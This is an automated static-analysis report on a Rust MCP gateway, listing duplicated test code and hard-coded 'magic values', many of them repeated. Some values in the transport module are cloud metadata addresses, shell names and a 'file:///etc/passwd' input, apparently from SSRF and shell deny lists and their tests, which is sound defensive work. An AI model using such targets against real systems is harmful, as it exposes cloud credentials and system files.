        let client_ip: IpAddr = "192.168.1.100".parse().unwrap();
        store.insert("test-state".to_string(), PkceState {
            code_verifier: "verifier123".to_string(),
            created_at: Instant::now(),
            client_ip,
        });
        
        // Verify the stored state has the correct IP
        let state = store.get("test-state").unwrap();
        assert_eq!(state.client_ip, client_ip);
        assert_eq!(state.code_verifier, "verifier123");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 406

**Code:**
```
fn generate_random_string(len: usize) -> String {
    use base64::Engine;
    use rand::RngCore;
    use rand::rngs::OsRng;

    // Calculate bytes needed: base64 encodes 3 bytes to 4 chars
    // We need enough bytes to produce at least `len` characters
    // Manual div_ceil for MSRV 1.75 compatibility: (a + b - 1) / b
    let bytes_needed = (len * 3 + 4 - 1) / 4;
    let mut bytes = vec![0u8; bytes_needed];
    OsRng.fill_bytes(&mut bytes);

    // Encode with URL-safe base64 and truncate to desired length
    let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&bytes);
    encoded[..len].to_string()
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.5% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1188

**Code:**
```
    fn test_config_is_multi_server() {
        let mut config = create_valid_config();
        assert!(!config.is_multi_server());

        config.upstream.servers.push(ServerRouteConfig {
            name: "test".to_string(),
            path_prefix: "/test".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("http://localhost:8080".to_string()),
            strip_prefix: false,
        });
        assert!(config.is_multi_server());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1068

**Code:**
```
    fn test_config_validation_jwt_invalid_jwks_url() {
        let mut config = create_valid_config();
        config.auth.jwt = Some(JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "invalid-url".to_string(),
                algorithms: default_jwks_algorithms(),
                cache_duration_secs: 3600,
            },
            issuer: "https://issuer.example.com".to_string(),
            audience: "mcp-guard".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1087

**Code:**
```
    fn test_config_validation_oauth_invalid_redirect_uri() {
        let mut config = create_valid_config();
        config.auth.oauth = Some(OAuthConfig {
            provider: OAuthProvider::GitHub,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None,
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "invalid-uri".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        });
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.7% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.6% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.5% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1209

**Code:**
```
    fn test_config_error_display() {
        let err = ConfigError::Parse("invalid TOML".to_string());
        assert!(format!("{}", err).contains("invalid TOML"));

        let err = ConfigError::Validation("port must be > 0".to_string());
        assert!(format!("{}", err).contains("port must be > 0"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 961

**Code:**
```
    fn test_server_config_defaults() {
        let config = ServerConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 3000);
        assert!(config.tls.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.1% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 978

**Code:**
```
    fn test_audit_config_defaults() {
        let config = AuditConfig::default();
        assert!(config.enabled);
        assert!(config.file.is_none());
        // SECURITY: stdout defaults to false to prevent accidental PII exposure
        assert!(!config.stdout);
        assert!(config.export_url.is_none());
        assert_eq!(config.export_batch_size, 100);
        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1020

**Code:**
```
    fn test_config_validation_invalid_port() {
        let mut config = create_valid_config();
        config.server.port = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1027

**Code:**
```
    fn test_config_validation_rate_limit_zero_rps() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.requests_per_second = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1035

**Code:**
```
    fn test_config_validation_rate_limit_zero_burst() {
        let mut config = create_valid_config();
        config.rate_limit.enabled = true;
        config.rate_limit.burst_size = 0;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1107

**Code:**
```
    fn test_config_validation_audit_invalid_export_url() {
        let mut config = create_valid_config();
        config.audit.export_url = Some("not-a-url".to_string());
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1107

**Code:**
```
    fn test_config_validation_audit_invalid_export_url() {
        let mut config = create_valid_config();
        config.audit.export_url = Some("not-a-url".to_string());
        assert!(config.validate().is_err());
    }
```

---

### ⚪ Low (394 issues)

#### Magic value '"Features:"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 300

---

#### Magic value '"jsonrpc"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 473

---

#### Magic value '"2.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 473

---

#### Magic value '"method"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 475

---

#### Magic value '"initialize"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 475

---

#### Magic value '"params"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 476

---

#### Magic value '"protocolVersion"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 477

---

#### Magic value '"capabilities"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 478

---

#### Magic value '"clientInfo"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 479

---

#### Magic value '"name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 480

---

#### Magic value '"version"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 481

---

#### Magic value '"name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 506

---

#### Magic value '"unknown"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 506

---

#### Magic value '"version"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 507

---

#### Magic value '"unknown"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 507

---

#### Magic value '"unknown"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 556

---

#### Magic value '"server:"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 879

---

#### Magic value '"transport:"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/main.rs`
- **Line:** 880

---

#### Long method 'spawn_unchecked' detected: 114 lines, 52 statements, complexity 3

- **File:** `src/transport/mod.rs`
- **Line:** 473

**Code:**
```
pub async fn spawn_unchecked(command: &str, args: &[String]) -> Result<Self, TransportError> {
        let mut child = Command::new(command)
            .args(args)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
...
```

**Recommendation:** Consider breaking down 'spawn_unchecked' into smaller, more focused methods. Current metrics: LOC=114, Statements=52, Complexity=3, Nesting=4

---

#### Long method 'spawn_unchecked' detected: 114 lines, 52 statements, complexity 3

- **File:** `src/transport/mod.rs`
- **Line:** 473

**Code:**
```
pub async fn spawn_unchecked(command: &str, args: &[String]) -> Result<Self, TransportError> {
        let mut child = Command::new(command)
            .args(args)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
...
```

**Recommendation:** Consider breaking down 'spawn_unchecked' into smaller, more focused methods. Current metrics: LOC=114, Statements=52, Complexity=3, Nesting=4

---

#### Long method 'send_sse_request' detected: 80 lines, 106 statements, complexity 17

- **File:** `src/transport/mod.rs`
- **Line:** 904

**Code:**
```
async fn send_sse_request(&self, message: &Message) -> Result<(), TransportError> {
        let mut request = self
            .client
            .post(&self.url)
            .header("Content-Type", "application/json")
...
```

**Recommendation:** Consider breaking down 'send_sse_request' into smaller, more focused methods. Current metrics: LOC=80, Statements=106, Complexity=17, Nesting=17

---

#### Long method 'send_sse_request' detected: 80 lines, 106 statements, complexity 17

- **File:** `src/transport/mod.rs`
- **Line:** 904

**Code:**
```
async fn send_sse_request(&self, message: &Message) -> Result<(), TransportError> {
        let mut request = self
            .client
            .post(&self.url)
            .header("Content-Type", "application/json")
...
```

**Recommendation:** Consider breaking down 'send_sse_request' into smaller, more focused methods. Current metrics: LOC=80, Statements=106, Complexity=17, Nesting=17

---

#### Magic value '"Timeout"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 62

---

#### Magic value '"http"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 146

---

#### Magic value '"https"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 146

---

#### Magic value '"metadata.google.internal"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 162

---

#### Magic value '"metadata.goog"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 163

---

#### Magic value '"169.254.169.254"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 164

---

#### Magic value '"fd00:ec2::254"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 165

---

#### Magic value '"metadata.azure.internal"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 166

---

#### Magic value '"100.100.100.200"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 167

---

#### Magic value '"bash"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 297

---

#### Magic value '"fish"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 297

---

#### Magic value '"dash"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 297

---

#### Magic value '"powershell"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 297

---

#### Magic value '"pwsh"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 297

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 351

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 354

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 357

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 360

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 363

---

#### Magic value '"stdio"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 668

---

#### Magic value '"http"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 814

---

#### Magic value '"2.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1043

---

#### Magic value '"tools/list"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1045

---

#### Magic value '"name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1053

---

#### Magic value '"get_weather"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1053

---

#### Magic value '"tools"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1061

---

#### Magic value '"2.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1063

---

#### Magic value '"code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1076

---

#### Magic value '32600' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/transport/mod.rs`
- **Line:** 1076

---

#### Magic value '"message"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1077

---

#### Magic value '"jsonrpc"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1148

---

#### Magic value '"2.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1148

---

#### Magic value '"result"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1150

---

#### Magic value '"tools"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1150

---

#### Magic value '"SSRF"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1297

---

#### Magic value '"file:///etc/passwd"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1308

---

#### Magic value '"bash"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1353

---

#### Magic value '"powershell"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1358

---

#### Magic value '"node"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1364

---

#### Magic value '"python3"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1367

---

#### Magic value '"8080"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1404

---

#### Magic value '"shell"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1423

---

#### Magic value '"jsonrpc"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1461

---

#### Magic value '"2.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1461

---

#### Magic value '"result"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1463

---

#### Magic value '"status"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1463

---

#### Magic value '"Timeout"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1508

---

